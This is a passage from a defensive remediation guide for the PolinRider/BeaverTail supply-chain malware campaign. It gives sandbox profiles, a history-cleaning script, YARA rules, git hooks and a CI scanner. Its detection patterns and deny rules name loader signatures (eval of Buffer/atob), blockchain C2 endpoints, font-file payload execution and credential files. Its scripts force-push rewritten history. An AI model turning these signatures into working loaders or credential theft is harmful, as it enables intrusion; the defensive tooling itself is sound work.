    (subpath (string-append (param "HOME") "/code"))
    (subpath (string-append (param "HOME") "/work")))
; ======= ALLOW the project =======
(allow file-read* file-write*
    (subpath (param "WORKDIR")))
; Allow reading the npm global cache (read-only)
(allow file-read*
    (subpath (string-append (param "HOME") "/.npm")))
(allow file-write*
    (subpath (string-append (param "HOME") "/.npm/_logs")))
; Allow using the SSH agent socket.
; The agent on the HOST holds the key bytes; the sandboxed process
; can authenticate without ever seeing the private key.
(allow file-read* file-write*
    (literal (param "SSH_AUTH_SOCK")))
; ======= NETWORK =======
; Allow full outbound network (npm install, git, API calls all need this).
(allow network-outbound)
(allow network-inbound (local))
Profile 2: no-network.sb - use this specifically for npm install and pip install on untrusted code. A postinstall hook that tries to phone home to a C2 server will fail silently with a network error.
; ~/.config/sandbox/no-network.sb
; Like read-only-home.sb but with ALL network blocked.
; Use for: npm install, pip install, running untrusted postinstall scripts.
(version 1)
(import "/System/Library/Sandbox/Profiles/bsd.sb")
(deny file-read* file-write*
    (subpath (string-append (param "HOME") "/.ssh")))
(deny file-write*
    (literal (string-append (param "HOME") "/.zshrc"))
    (literal (string-append (param "HOME") "/.bashrc"))
    (literal (string-append (param "HOME") "/.bash_profile")))
(deny file-read*
    (literal (string-append (param "HOME") "/.gitconfig"))
    (literal (string-append (param "HOME") "/.npmrc"))
    (literal (string-append (param "HOME") "/.config/gh/hosts.yml")))
(allow file-read* file-write*
    (subpath (param "WORKDIR")))
(allow file-read*
    (subpath (string-append (param "HOME") "/.npm")))
; Block all network. Nothing can phone home.
(deny network-outbound)
(deny network-inbound)
Profile 3: audit.sb - use this when you need to discover what permissions a tool actually needs. It allows everything but logs SSH access attempts to macOS's unified log. This is how you build a precise allowlist rather than guessing.
; ~/.config/sandbox/audit.sb
; Log-only mode. Everything is allowed, but SSH access is logged.
; Use with: sba COMMAND
; Then: log stream --predicate 'eventMessage contains "sandbox"' --level debug
(version 1)
(allow default)
(allow file-read* file-write* process-exec network*)
; Log SSH access attempts without blocking.
(deny file-read*
    (subpath (string-append (param "HOME") "/.ssh"))
    (with log)
    (with no-report))
The sb wrapper script - save this to ~/bin/sb, make it executable, and add ~/bin to your PATH once. After that, sb npm install, sb node server.js, and sbn npm install just work.
#!/bin/bash
# ~/bin/sb - sandbox-exec wrapper for everyday developer use
#
# Usage:
#   sb COMMAND [args...]          → sandboxed, network allowed, SSH blocked
#   sb --no-net COMMAND [args...] → sandboxed, NO network (for installs)
#   sb --audit COMMAND [args...]  → audit mode, log what the tool accesses
#
# Aliases to add to ~/.zshrc (once, then lock with chflags schg):
#   alias sbn="sb --no-net"
#   alias sba="sb --audit"
set -euo pipefail
PROFILE_DIR="$HOME/.config/sandbox"
PROFILE="$PROFILE_DIR/read-only-home.sb"
case "${1:-}" in
    --no-net)  PROFILE="$PROFILE_DIR/no-network.sb"; shift ;;
    --audit)   PROFILE="$PROFILE_DIR/audit.sb";      shift ;;
    --help|-h)
        echo "sb [--no-net|--audit] COMMAND [args...]"
        echo ""
        echo "  (no flag)   block ~/.ssh and shell profiles, allow network"
        echo "  --no-net    also block all network (use for npm/pip install)"
        echo "  --audit     log-only mode, discover what a tool needs"
        exit 0
        ;;
esac
[[ $# -eq 0 ]] && { echo "Usage: sb [--no-net|--audit] COMMAND [args...]"; exit 1; }
if [[ ! -f "$PROFILE" ]]; then
    echo "sb: profile not found: $PROFILE"
    echo "  Run: mkdir -p ~/.config/sandbox && cp *.sb ~/.config/sandbox/"
    exit 1
fi
WORKDIR="$(pwd)"
SSH_SOCK="${SSH_AUTH_SOCK:-/tmp/no-auth-sock}"
# sandbox-exec requires absolute paths - relative commands fail silently
CMD="$(command -v "$1" 2>/dev/null || echo "$1")"
shift
exec sandbox-exec -f "$PROFILE" \
    -D HOME="$HOME" \
    -D WORKDIR="$WORKDIR" \
    -D SSH_AUTH_SOCK="$SSH_SOCK" \
    "$CMD" "$@"
Install everything:
mkdir -p ~/.config/sandbox ~/bin
chmod 644 ~/.config/sandbox/*.sb
chmod +x ~/bin/sb
echo 'export PATH="$HOME/bin:$PATH"' >> ~/.zshrc
echo 'alias sbn="sb --no-net"' >> ~/.zshrc
echo 'alias sba="sb --audit"' >> ~/.zshrc
source ~/.zshrc
# Lock the shell profile so malware cannot append to it
chflags schg ~/.zshrc ~/.bashrc ~/.bash_profile 2>/dev/null || \
    chattr +i ~/.zshrc ~/.bashrc 2>/dev/null   # Linux fallback
# Verify sb works
sb echo "sandbox is working"
2.3 - VS Code Workspace Trust and TasksJacker Defence
TasksJacker abuses VS Code's .vscode/tasks.json and .vscode/settings.json workspace configuration files to execute commands in your terminal. These files live inside the cloned repository, so opening an infected repo in VS Code can cause code execution before you even run anything manually. The defence has two layers: configure VS Code to never automatically run workspace tasks, and scan .vscode/ before you open any folder.
// Add to: ~/.vscode/settings.json (user-level, NOT workspace-level)
// User settings cannot be overridden by a workspace's .vscode/settings.json
{
    "security.workspace.trust.enabled": true,
    "security.workspace.trust.untrustedFiles": "prompt",
    "security.workspace.trust.startupPrompt": "always",
    "security.workspace.trust.banner": "always",
// Critical: never run tasks automatically.
    // An attacker's tasks.json cannot execute without your explicit approval.
    "task.allowAutomaticTasks": "off",
    // Prevent auto-updating extensions - require manual review of updates
    "extensions.autoUpdate": false,
    "extensions.autoCheckUpdates": false,
    // Disable workspace-level terminal profile overrides
    "terminal.integrated.allowWorkspaceConfiguration": false
}
2.4 - Protecting npm Lifecycle Hooks
npm install runs lifecycle scripts (preinstall, postinstall, prepare) with your full user permissions. The correct approach is to never run these scripts from untrusted packages in your real environment.
# Install deps with network blocked and lifecycle scripts disabled.
# --ignore-scripts: postinstall hooks do not run at all.
# The no-network sandbox ensures even if scripts run, they cannot phone home.
sbn npm install --ignore-scripts
# After install, audit which packages have lifecycle scripts
# before deciding whether to allow them to run
node -e "
const fs = require('fs');
const path = require('path');
const hooks = ['preinstall','install','postinstall','prepare','prepack','postpack'];
const nm = './node_modules';
if (!fs.existsSync(nm)) { console.log('No node_modules'); process.exit(0); }
fs.readdirSync(nm)
  .filter(d => !d.startsWith('.'))
  .forEach(pkg => {
    const pkgPath = path.join(nm, pkg, 'package.json');
    if (!fs.existsSync(pkgPath)) return;
    try {
      const p = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
      const scripts = p.scripts || {};
      const found = hooks.filter(h => scripts[h]);
      if (found.length) {
        console.log(pkg + ':');
        found.forEach(h => console.log('  ' + h + ': ' + scripts[h]));
      }
    } catch(e) {}
  });
"
npm audit --audit-level=moderate

---

Part 3: Programmatic Enterprise Recovery and CI Hardening
For platform engineers and repository administrators. Goal: surgically clean many repositories that have accumulated legitimate commits on top of malicious ones, harden all repositories against future injection, and build a CI pipeline that detects any recurrence automatically.
The Challenge of Cleaning History with Commits On Top
The naive approach to removing a malicious commit is git revert. This works perfectly when the bad commit is at the HEAD of the branch - you simply add a new commit that undoes the changes. But when legitimate developer work has accumulated on top of the injection, a revert will partially undo that work (because the diff conflicts) or leave behind a messy three-way merge that is hard to audit.
The second naive approach is git filter-branch or git filter-repo --path --invert-paths, which removes an entire file from history. But PolinRider only appended a few lines to the end of existing legitimate files - removing the entire file would destroy months of legitimate development.
The correct approach is what we call a surgical clean: use git filter-repo's blob callback API to rewrite every historical snapshot of every affected file, removing only the malicious lines while leaving all legitimate content intact. The result is a history that looks exactly as it would have if the injection had never happened, with every legitimate commit preserved in its correct position.
3.1 - Setting Up git-filter-repo
# Install via pip
pip3 install git-filter-repo --break-system-packages
# Or install the single-file version directly
curl -sL https://raw.githubusercontent.com/newren/git-filter-repo/main/git-filter-repo \
    -o ~/bin/git-filter-repo
chmod +x ~/bin/git-filter-repo
git filter-repo --version
# IMPORTANT: git-filter-repo refuses to run on a non-fresh clone.
# Best practice: always work on a mirror clone, not your original.
git clone --mirror git@github.com:OWNER/REPO.git ./REPO-clean-$(date +%Y%m%d)
3.2 - The Surgical Clean Engine
The key insight of this script is that git filter-repo's blob callback receives every single file snapshot that has ever existed across every commit in the entire history. By scanning each blob for IOC patterns and stripping only the matching lines, we rewrite the repository's object database so that the payload never appears anywhere in any historical state, while all other content remains exactly unchanged.
#!/usr/bin/env python3
# surgical-clean.py - surgically remove PolinRider payload from git history
#
# Usage:
#   python3 surgical-clean.py                (run from repo directory)
#   python3 surgical-clean.py --dry-run      (preview, no changes)
#
# Requires: git-filter-repo (pip install git-filter-repo)
# IMPORTANT: Run from a MIRROR CLONE, not your original repo directory.
#
# EXTENSIBILITY NOTE: The RAW_IOC_PATTERNS list uses compiled regex against
# raw bytes. When new variants are identified, add patterns here. The broader
# the pattern, the more future-proof it is - prefer structural signatures
# over literal version strings. A pattern like rb"eval\s*\(\s*Buffer\.from"
# survives whitespace obfuscation; a literal like rb"eval(Buffer.from(" does not.
import sys
import re
import os
import argparse
from pathlib import Path
# IOC patterns compiled against raw byte content.
# We search bytes rather than decoded text because Glassworm may use
# multi-byte Unicode sequences that only make sense at the byte level.
RAW_IOC_PATTERNS = [
    # PolinRider variant 2 version marker - flexible to tolerate any quote style
    rb"global\[.{0,5}_V.{0,5}\]\s*=\s*.{0,5}8-",
    # PolinRider variant 1 marker
    rb"rmcej.{0,5}otb",
    # BeaverTail stage-1 loader - eval of base64/buffer content
    rb"eval\s*\(\s*Buffer\.from",
    rb"eval\s*\(\s*atob\s*\(",
    # Blockchain C2 endpoints
    rb"trongrid\.io",
    rb"fullnode\.mainnet\.aptoslabs\.com",
    rb"bsc-dataseed",
    rb"aptos-mainnet\.nodereal",
    # Shuffle-cipher decoder (legitimate code rarely has 15+ inline char codes)
    rb"String\.fromCharCode\((?:\d+,\s*){15,}",
    # XOR key + eval combo (stage-2 decryption)
    rb"\.split\(..\)\.map.*XOR.*eval",
]
TARGET_EXTENSIONS = {
    b'.js', b'.mjs', b'.cjs', b'.ts', b'.tsx', b'.jsx',
    b'.py', b'.rb', b'.php', b'.sh',
}
class SurgicalCleaner:
    def __init__(self, dry_run=False, verbose=False):
        self.dry_run = dry_run
        self.verbose = verbose
        self.compiled_patterns = [re.compile(p, re.IGNORECASE) for p in RAW_IOC_PATTERNS]
        self.files_cleaned = 0
        self.lines_removed = 0
        self.blobs_scanned = 0
        self.report_lines = []
    def should_scan(self, blob):
        if blob.filename is None:
            return False
        filename = blob.filename
        ext = Path(filename.decode(errors='replace')).suffix.encode()
        return ext.lower() in TARGET_EXTENSIONS
    def find_ioc_lines(self, content_bytes):
        matches = []
        lines = content_bytes.split(b'\n')
        for i, line in enumerate(lines, 1):
            for pattern in self.compiled_patterns:
                if pattern.search(line):
                    matches.append((i, line))
                    break
        return matches
    def clean_blob(self, blob):
        if not self.should_scan(blob):
            return
        self.blobs_scanned += 1
        ioc_lines = self.find_ioc_lines(blob.data)
        if not ioc_lines:
            return
        filename = blob.filename.decode(errors='replace')
        self.files_cleaned += 1
        self.lines_removed += len(ioc_lines)
        report_entry = f"\n  File: {filename} - {len(ioc_lines)} malicious line(s) removed"
        for lineno, line in ioc_lines:
            line_preview = line.decode(errors='replace')[:120]
            report_entry += f"\n    Line {lineno}: {line_preview}"
        self.report_lines.append(report_entry)
        if self.verbose or self.dry_run:
            print(report_entry)
        if not self.dry_run:
            lines = blob.data.split(b'\n')
            ioc_line_numbers = {lineno for lineno, _ in ioc_lines}
            cleaned_lines = [
                line for i, line in enumerate(lines, 1)
                if i not in ioc_line_numbers
            ]
            blob.data = b'\n'.join(cleaned_lines)
    def print_summary(self):
        mode = "DRY RUN - " if self.dry_run else ""
        print(f"\n{'='*60}")
        print(f"{mode}SURGICAL CLEAN SUMMARY")
        print(f"{'='*60}")
        print(f"  Blobs scanned:  {self.blobs_scanned}")
        print(f"  Files cleaned:  {self.files_cleaned}")
        print(f"  Lines removed:  {self.lines_removed}")
        if self.files_cleaned == 0:
            print("\n  Repository appears CLEAN - no IOC patterns found.")
        elif self.dry_run:
            print("\n  Run without --dry-run to apply changes.")
        else:
            print("\n  History has been rewritten.")
            print("  Next steps:")
            print("    1. Verify: git log --oneline -10")
            print("    2. Push:   git push --force --all && git push --force --tags")
            print("    3. Notify: create a GitHub security advisory for downstream users")
        print(f"{'='*60}\n")
def main():
    parser = argparse.ArgumentParser(
        description='Surgically remove PolinRider payload from git history'
    )
    parser.add_argument('--dry-run', action='store_true',
                        help='Preview what would be removed without making changes')
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='Print details of every finding as it is found')
    args = parser.parse_args()
    if not Path('.git').exists():
        print("Error: not a git repository. Run from the repo root directory.")
        sys.exit(1)
    try:
        import git_filter_repo as fr
    except ImportError:
        print("Error: git-filter-repo is not installed.")
        print("Install: pip3 install git-filter-repo --break-system-packages")
        sys.exit(1)
    cleaner = SurgicalCleaner(dry_run=args.dry_run, verbose=args.verbose)
    mode = "DRY RUN" if args.dry_run else "LIVE"
    print(f"Starting surgical clean [{mode}] in {os.getcwd()}...")
    print(f"Scanning for {len(RAW_IOC_PATTERNS)} IOC patterns across all history...\n")
    filter_args = fr.FilteringOptions.default_options()
    filter_args.force = True
    repo_filter = fr.RepoFilter(
        filter_args,
        blob_callback=cleaner.clean_blob
    )
    repo_filter.run()
    cleaner.print_summary()
    return 0 if cleaner.files_cleaned == 0 else 1
if __name__ == '__main__':
    sys.exit(main())
3.3 - Batch Clean Across Many Repositories
#!/bin/bash
# batch-clean.sh - automated recovery for all repos flagged in triage-report.tsv
#
# Usage: ./batch-clean.sh triage-report.tsv
#
# Each repo goes through:
#  1. Forensic snapshot before any changes
#  2. Surgical clean
#  3. Verification (no IOC anywhere in full history)
#  4. Force-push if clean
#  5. Quarantine to manual-review/ if verification fails
REPORT="${1:-triage-report.tsv}"
MANUAL_REVIEW_DIR="manual-review-$(date +%Y%m%d)"
REMEDIATION_LOG="remediation-log-$(date +%Y%m%d%H%M%S).txt"
SUCCESS_COUNT=0
FAIL_COUNT=0
SKIP_COUNT=0
mkdir -p "$MANUAL_REVIEW_DIR"
echo "PolinRider Batch Remediation Log - $(date)" > "$REMEDIATION_LOG"
while IFS=$'\t' read -r repo status inject_hash inject_date email files commits ioc notes; do
    [[ "$repo" == "repo" ]] && continue
    [[ "$status" == "CLEAN" ]] && { ((SKIP_COUNT++)); continue; }
    [[ -z "$repo" ]] && continue
    echo "========================================"
    echo "Processing: $repo [$status]"
    REPO_DIR="./$repo"
    if [[ ! -d "$REPO_DIR/.git" ]]; then
        echo "  SKIP: directory not found"
        ((SKIP_COUNT++))
        continue
    fi
    SNAPSHOT="forensic-${repo}-$(date +%s).tar.gz"
    tar -czf "$SNAPSHOT" "$REPO_DIR/" 2>/dev/null
    echo "  Snapshot: $SNAPSHOT"
    (cd "$REPO_DIR" && python3 ../surgical-clean.py 2>&1) | head -20
    # Verify - no IOC anywhere in full history
    IOC_REMAINING=$(cd "$REPO_DIR" && git log --all -p \
        -- '*.js' '*.mjs' '*.ts' 2>/dev/null | \
        grep -cE \
        "global\[.{0,5}_V.{0,5}\].*8-|eval\s*\(\s*Buffer\.from|trongrid\.io|bsc-dataseed" \
        || true)
    UNICODE_REMAINING=$(cd "$REPO_DIR" && git grep -Pl \
        '[\x{200B}-\x{200F}\x{FE00}-\x{FE0F}]' \
        -- '*.js' '*.mjs' 2>/dev/null | wc -l | tr -d ' ' || true)
    if [[ "$IOC_REMAINING" -gt 0 || "$UNICODE_REMAINING" -gt 0 ]]; then
        echo "  FAIL: IOC still present - moving to manual-review/"
        cp -r "$REPO_DIR" "$MANUAL_REVIEW_DIR/"
        echo "[$repo] FAILED VERIFICATION" >> "$REMEDIATION_LOG"
        ((FAIL_COUNT++))
        continue
    fi
    cd "$REPO_DIR" || continue
    git push origin --force --all 2>&1
    git push origin --force --tags 2>&1
    cd - > /dev/null
    echo "  SUCCESS: $repo cleaned and pushed."
    echo "[$repo] CLEANED: ${inject_hash:0:16} removed, $commits legit commits preserved" \
        >> "$REMEDIATION_LOG"
    ((SUCCESS_COUNT++))
done < "$REPORT"
echo "========================================"
echo "BATCH REMEDIATION COMPLETE"
echo "  Cleaned and pushed: $SUCCESS_COUNT repos"
echo "  Failed verification: $FAIL_COUNT repos (see $MANUAL_REVIEW_DIR/)"
echo "  Skipped (clean):    $SKIP_COUNT repos"
echo "========================================"
3.4 - YARA Rules for PolinRider IOCs
YARA is the standard tool for writing and running malware signature rules. These rules encode the specific, confirmed PolinRider fingerprints. Add them to your CI pipeline, your local pre-commit hook, and any SIEM or file integrity monitoring system.
A key design principle in the rules below: extension restrictions are removed from payload detectors and replaced with explicit binary-extension detectors. This is the lesson from Part 4 - limiting rules to *.js creates the exact blind spot the attacker exploited. The rules now detect payloads in any file, while a separate rule specifically catches the binary-extension disguise technique.
/*
 * polinrider-complete.yar - unified YARA ruleset for PolinRider / BeaverTail / Glassworm
 *
 * Design principles:
 *   1. Payload rules have NO filename restriction - the font-file vector proved
 *      extension-based filtering is a trust model, not a security model.
 *   2. Patterns are structural, not literal - they tolerate minor obfuscation
 *      (whitespace changes, quote-style changes, variable renaming).
 *   3. A separate rule catches the binary-extension disguise technique.
 *   4. False-positive reduction uses co-occurrence conditions, not fragile
 *      single-string matches.
 *
 * Usage:
 *   yara -r polinrider-complete.yar .
 *   find . -not -path '*/node_modules/*' | xargs yara polinrider-complete.yar
 */rule PolinRider_V2_VersionTag {
    meta:
        description = "PolinRider variant 2 per-injection version tag"
        severity    = "critical"
        campaign    = "PolinRider"
        note        = "Flexible pattern - tolerates quote style and spacing variation"
    strings:
        // Sequential batch IDs: 8-st1 through 8-st59 (at least)
        $v_sequential = /global\[.{0,3}_V.{0,3}\]\s*=\s*.{0,3}8-st\d{1,3}/
        // Numeric batch IDs: 8-413, 8-683, 8-778, 8-974 etc.
        $v_numeric    = /global\[.{0,3}_V.{0,3}\]\s*=\s*.{0,3}8-\d{3,4}/
    condition:
        any of them
        // No filename restriction - matches .woff2, .png, .js, or any extension
}
rule PolinRider_V1_Marker {
    meta:
        description = "PolinRider variant 1 rmcej_otb injection marker"
        severity    = "critical"
        campaign    = "PolinRider"
    strings:
        $marker = /rmcej.{0,5}otb/
    condition:
        $marker
}
rule BeaverTail_BlockchainC2 {
    meta:
        description = "BeaverTail blockchain dead-drop C2 endpoint"
        severity    = "critical"
        campaign    = "PolinRider / BeaverTail"
        note        = "No filename restriction - payload may be inside any file extension"
    strings:
        $tron    = "api.trongrid.io"              ascii wide
        $aptos   = "fullnode.mainnet.aptoslabs.com" ascii wide
        $bsc     = "bsc-dataseed"                 ascii wide
        $solana  = "api.mainnet-beta.solana.com"  ascii wide
        $aptos2  = "aptos-mainnet.nodereal"       ascii wide
    condition:
        any of them
}
rule BeaverTail_Stage1_Loader {
    meta:
        description = "BeaverTail stage-1 obfuscated loader (eval + base64)"
        severity    = "critical"
        campaign    = "PolinRider / BeaverTail"
        note        = "Structural pattern - tolerates whitespace obfuscation"
    strings:
        $eval_buf  = /eval\s*\(\s*Buffer\.from\s*\(/ ascii
        $eval_atob = /eval\s*\(\s*atob\s*\(/         ascii
    condition:
        any of them
}
rule Glassworm_InvisibleUnicode {
    meta:
        description = "Invisible Unicode characters used to hide payload (Glassworm)"
        severity    = "critical"
        campaign    = "PolinRider / Glassworm"
        note        = "Byte-level detection - chars are invisible in editors and diffs"
    strings:
        $zwsp  = { E2 80 8B }   // U+200B Zero-width space
        $zwj   = { E2 80 8D }   // U+200D Zero-width joiner
        $bom   = { EF BB BF }   // U+FEFF BOM mid-file
        $vs1   = { EF B8 80 }   // U+FE00 Variation Selector-1
        $vs2   = { EF B8 81 }   // U+FE01 Variation Selector-2
        $rtlo  = { E2 80 AE }   // U+202E Right-to-Left Override
    condition:
        // Require at least two occurrences to reduce false positives
        2 of them
        and (
            filename matches /\.(js|mjs|ts|py|rb|sh|cjs)$/i
        )
}
rule BinaryExtension_JavaScript_Payload {
    meta:
        description = "JavaScript code stored in a binary-extension file (font/image disguise)"
        severity    = "critical"
        campaign    = "PolinRider font vector"
        note        = "Catches node ./public/fonts/payload.woff2 pattern"
    strings:
        $iife_open   = "(function("   ascii
        $iife_open2  = "!function("   ascii
        $var_decl    = "var _0x"      ascii   // hex-variable obfuscation
        $eval_open   = "eval("        ascii
        $require_    = "require('"    ascii
        $process_env = "process.env"  ascii
        $buf_from    = "Buffer.from(" ascii
    condition:
        (
            filename matches /\.(woff2?|ttf|otf|eot|png|jpg|jpeg|gif|ico|bmp|webp|mp3|mp4)$/i
        )
        and (
            // File does NOT start with known font/image magic bytes
            not (
                uint32(0) == 0x324F4677 or  // wOF2
                uint32(0) == 0x4646574F or  // wOFF
                uint32(0) == 0x4F54544F or  // OTTO (OpenType)
                uint32(0) == 0x00010000 or  // TTF null header
                uint32(0) == 0x474E5089 or  // PNG
                uint16(0) == 0xD8FF         // JPEG
            )
        )
        and any of ($iife_open, $iife_open2, $var_decl, $eval_open, $require_, $process_env, $buf_from)
}
rule TasksJson_FontPayload_Execution {
    meta:
        description = "VS Code tasks.json configured to execute a font/binary-extension file with Node.js"
        severity    = "critical"
        campaign    = "PolinRider TasksJacker + font vector"
    strings:
        $node_woff2  = /node\s+[^\s"']*\.woff2/ ascii
        $node_woff   = /node\s+[^\s"']*\.woff/  ascii
        $node_ttf    = /node\s+[^\s"']*\.ttf/   ascii
        $node_png    = /node\s+[^\s"']*\.png/   ascii
        $folder_open = "\"folderOpen\""          ascii
        $hide_true   = "\"hide\": true"          ascii
    condition:
        any of ($node_woff2, $node_woff, $node_ttf, $node_png)
        and ($folder_open or $hide_true)
}
rule BeaverTail_ShuffleCipher_Decoder {
    meta:
        description = "4-layer shuffle-cipher decoder pattern"
        severity    = "high"
        campaign    = "PolinRider / BeaverTail"
        note        = "fromCharCode with 15+ sequential codes is the decode unroll"
    strings:
        $charcode_chain = /String\.fromCharCode\(\d+(,\s*\d+){14,}/
        $xor_map = /\.split\(.\)\.map.*\.charCodeAt.*\^/
    condition:
        any of them
}

3.5 - Global Git Hooks: Pre-Commit and Post-Merge
These hooks run automatically on every git commit and every git pull/merge across every repository on your machine. You configure them once using core.hooksPath and they apply globally without any per-project setup.
#!/bin/bash
# ~/.config/git/hooks/pre-commit
# Runs before every commit. Scans staged content for PolinRider IOCs.
# Blocks the commit if IOC patterns are found.
#
# Install globally: git config --global core.hooksPath ~/.config/git/hooks
# Make executable: chmod +x ~/.config/git/hooks/pre-commit
echo "[pre-commit] Scanning staged files for PolinRider IOCs..."
STAGED=$(git diff --cached --name-only --diff-filter=ACM \
    | grep -E '\.(js|mjs|cjs|ts|tsx|py|sh|json)$' || true)
[[ -z "$STAGED" ]] && exit 0
# Scan the actual staged content (not the working tree)
HITS=$(git diff --cached -- $STAGED \
    | grep "^\+" | grep -v "^+++" \
    | grep -E \
    "global\[.{0,5}_V.{0,5}\].*8-|eval\s*\(\s*Buffer\.from|trongrid\.io|bsc-dataseed|rmcej.*otb" \
    || true)
if [[ -n "$HITS" ]]; then
    echo ""
    echo "[pre-commit] BLOCKED - PolinRider IOC found in staged content:"
    echo "$HITS"
    echo ""
    echo "  If this is a false positive, inspect the flagged lines and"
    echo "  use: git commit --no-verify  (only after manual confirmation)"
    exit 1
fi
# Also scan any binary-extension files in the staged set for JavaScript content
for f in $(git diff --cached --name-only --diff-filter=ACM | \
    grep -E '\.(woff2?|ttf|otf|png|jpg|ico|gif)$' || true); do
    if [[ -f "$f" ]]; then
        TRUE_TYPE=$(file --brief --mime-type "$f" 2>/dev/null)
        if [[ "$TRUE_TYPE" == "text/"* || "$TRUE_TYPE" == "application/javascript"* ]]; then
            echo "[pre-commit] BLOCKED - binary-extension file contains text/code: $f ($TRUE_TYPE)"
            exit 1
        fi
    fi
done
# Run YARA if available
if command -v yara &>/dev/null && [[ -f "$HOME/.config/yara/polinrider-complete.yar" ]]; then
    for f in $STAGED; do
        [[ -f "$f" ]] || continue
        YARA_HIT=$(yara -r "$HOME/.config/yara/polinrider-complete.yar" "$f" 2>/dev/null || true)
        if [[ -n "$YARA_HIT" ]]; then
            echo "[pre-commit] YARA hit on $f:"
            echo "$YARA_HIT"
            exit 1
        fi
    done
fi
echo "[pre-commit] Clean."
exit 0
#!/bin/bash
# ~/.config/git/hooks/post-merge
# Runs after every git pull or git merge.
# Scans files changed in the merge for PolinRider IOCs.
echo "[post-merge] Scanning merged changes..."
CHANGED=$(git diff-tree -r --name-only --no-commit-id ORIG_HEAD HEAD \
    | grep -E '\.(js|mjs|ts|cjs|py)$' || true)
[[ -z "$CHANGED" ]] && { echo "[post-merge] No relevant files changed."; exit 0; }
HITS=$(echo "$CHANGED" | xargs grep -l \
    -e "global\['_V'\]" \
    -e "eval(Buffer.from" \
    -e "trongrid.io" \
    -e "bsc-dataseed" \
    2>/dev/null || true)
if [[ -n "$HITS" ]]; then
    echo ""
    echo "[post-merge] WARNING - PolinRider IOC found in merged files:"
    echo "$HITS"
    echo ""
    echo "  To undo this merge: git revert ORIG_HEAD"
    echo "  To inspect the diff: git diff ORIG_HEAD..HEAD -- $HITS"
    exit 1
fi
UNICODE_HIT=$(echo "$CHANGED" | xargs grep -lP \
    '[\x{200B}-\x{200F}\x{FE00}-\x{FE0F}]' \
    2>/dev/null || true)
if [[ -n "$UNICODE_HIT" ]]; then
    echo "[post-merge] WARNING - invisible Unicode found in merged files:"
    echo "$UNICODE_HIT"
    echo "  Run: python3 unicode-audit.py $UNICODE_HIT"
fi
echo "[post-merge] Clean."
exit 0
Install globally:
mkdir -p ~/.config/git/hooks
chmod +x ~/.config/git/hooks/pre-commit
chmod +x ~/.config/git/hooks/post-merge
git config --global core.hooksPath ~/.config/git/hooks
git config --global core.hooksPath  # verify: should print the path
3.6 - The Protected GitHub Actions Workflow
The CI scanner is your last line of defence. The critical design principle is that the workflow file itself must be protected by branch protection rules. If an attacker can modify the workflow file, they can disable the scanner. Configure your repository so that changes to .github/workflows/ require a pull request with at least one reviewer.
# .github/workflows/polinrider-scan.yml
#
# IMPORTANT: Protect this file. In repository Settings → Branches → main,
# enable "Require a pull request before merging" and set required reviewers
# to at least 1. Without protection, an attacker can disable the scanner
# on the very push that reintroduces the malware.
name: PolinRider malware scan
on:
  push:
    branches: ["*"]
  pull_request:
  schedule:
    - cron: "0 2 * * 0"  # Weekly Sunday scan catches force-push injections
permissions:
  contents: read
  security-events: write
jobs:
  scan:
    name: IOC scan
    runs-on: ubuntu-latest
    steps:
      - name: Checkout full history
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # pinned SHA
        with:
          fetch-depth: 0  # full history required for git log checks
      - name: Install scanning tools
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y --no-install-recommends yara
          pip install semgrep --quiet
      - name: Scan source files for text-based IOCs
        run: |
          echo "=== Scanning source files for text-based IOCs ==="
          # Flexible patterns - structural, not literal
          HITS=$(grep -rn \
            --include="*.js" --include="*.mjs" --include="*.cjs" \
            --include="*.ts" --include="*.tsx" \
            -E "global\[.{0,5}_V.{0,5}\].*8-|eval\s*\(\s*Buffer\.from|trongrid\.io|bsc-dataseed|rmcej.{0,5}otb" \
            . | grep -v "node_modules\|\.git" || true)
          if [ -n "$HITS" ]; then
            echo "::error::PolinRider IOC detected in source files"
            echo "$HITS"
            exit 1
          fi
          echo "Text IOC scan: CLEAN"
      - name: Scan binary-extension files for JavaScript content
        run: |
          echo "=== Scanning binary-extension files for disguised payloads ==="
          python3 << 'PYEOF'
          import os, sys, subprocess
          BINARY_EXTS = {'.woff2', '.woff', '.ttf', '.otf', '.eot',
                         '.png', '.jpg', '.jpeg', '.gif', '.ico', '.webp'}
          findings = []
          for root, dirs, files in os.walk('.'):
              dirs[:] = [d for d in dirs if d not in ('node_modules', '.git')]
              for fname in files:
                  ext = os.path.splitext(fname)[1].lower()
                  if ext not in BINARY_EXTS:
                      continue
                  fpath = os.path.join(root, fname)
                  try:
                      result = subprocess.run(
                          ['file', '--brief', '--mime-type', fpath],
                          capture_output=True, text=True
                      )
                      mime = result.stdout.strip()
                      if 'text' in mime or 'javascript' in mime:
                          findings.append(f"{fpath} (reported as: {mime})")
                  except Exception:
                      pass
          if findings:
              print("::error::Binary-extension files with text/code content detected:")
              for f in findings:
                  print(f"  {f}")
              sys.exit(1)
          print("Binary-extension content scan: CLEAN")
          PYEOF
      - name: Scan for invisible Unicode (Glassworm)
        run: |
          echo "=== Scanning for invisible Unicode characters ==="
          python3 << 'PYEOF'
          import os, sys
          SUSPICIOUS_RANGES = [
              (0x200B, 0x200F), (0x202A, 0x202E), (0x2060, 0x2064),
              (0xFE00, 0xFE0F), (0xE000, 0xF8FF), (0xFEFF, 0xFEFF),
              (0xFFF0, 0xFFFF), (0xE0000, 0xE007F),
          ]
          def is_suspicious(cp):
              return any(lo <= cp <= hi for lo, hi in SUSPICIOUS_RANGES)
          findings = []
          for root, dirs, files in os.walk('.'):
              dirs[:] = [d for d in dirs if d not in ('node_modules', '.git')]
              for fname in files:
                  if not fname.endswith(('.js','.mjs','.ts','.py','.cjs')):
                      continue
                  fpath = os.path.join(root, fname)
                  try:
                      content = open(fpath, encoding='utf-8', errors='replace').read()
                      for i, line in enumerate(content.splitlines(), 1):
                          suspicious = [c for c in line if is_suspicious(ord(c))]
                          if len(suspicious) >= 2:
                              findings.append(f"{fpath}:{i}: {len(suspicious)} suspicious Unicode chars")
                  except Exception:
                      pass
          if findings:
              print("::error::Glassworm invisible Unicode detected:")
              for f in findings:
                  print(f"  {f}")
              sys.exit(1)
          print("Unicode scan: CLEAN")
          PYEOF
      - name: Check for ForceMemo date falsification
        run: |
          echo "=== Checking for suspicious author/committer date gaps ==="
          python3 << 'PYEOF'
          import subprocess, sys
          from datetime import datetime
          def parse_date(s):
              s = s.strip()
              if len(s) > 5 and s[-5] in '+-' and ':' not in s[-5:]:
                  s = s[:-2] + ':' + s[-2:]
